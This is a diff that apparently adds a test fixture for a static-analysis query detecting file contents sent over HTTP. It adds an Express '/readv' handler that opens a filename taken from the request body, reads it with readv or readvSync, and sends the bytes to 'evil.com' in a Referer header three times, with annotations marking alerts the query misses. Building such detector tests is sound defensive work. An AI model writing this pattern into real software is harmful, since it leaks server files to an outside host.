@@ -26,3 +26,36 @@ const fsp = require("fs").promises;
     console.error("Error reading file:", error);
   }
 })();
+
+app.post('/readv', async (req, res) => {
+  const { filename } = req.body;
+  const fd = await fs.open(filename, 'r'); 
+
+  const buffer = [Buffer.alloc(1024), Buffer.alloc(1024)]; // $ MISSING: Source[js/file-access-to-http]
+  const { bytesRead } = fs.readvSync(fd, buffer); 
+  https.get({
+    hostname: "evil.com",
+    path: "/upload",
+    method: "GET",
+    headers: { Referer: buffer }
+  }, () => { }); // $ MISSING: Alert[js/file-access-to-http]
+
+  const buffer1 = Buffer.alloc(1024); // $ MISSING: Source[js/file-access-to-http]
+  const { bytesRead1 } = fs.readvSync(fd, [buffer1]); 
+  https.get({
+    hostname: "evil.com",
+    path: "/upload",
+    method: "GET",
+    headers: { Referer: buffer1.slice(0, bytesRead1).toString() }
+  }, () => { }); // $ MISSING: Alert[js/file-access-to-http]
+
+  const buffer2 = Buffer.alloc(1024); // $ MISSING: Source[js/file-access-to-http]
+  fs.readv(fd, [buffer2], (err, bytesRead2) => {
+    https.get({
+      hostname: "evil.com",
+      path: "/upload",
+      method: "GET",
+      headers: { Referer: buffer2.slice(0, bytesRead2).toString() }
+    }, () => { }); // $ MISSING: Alert[js/file-access-to-http]
+  }); 
+});
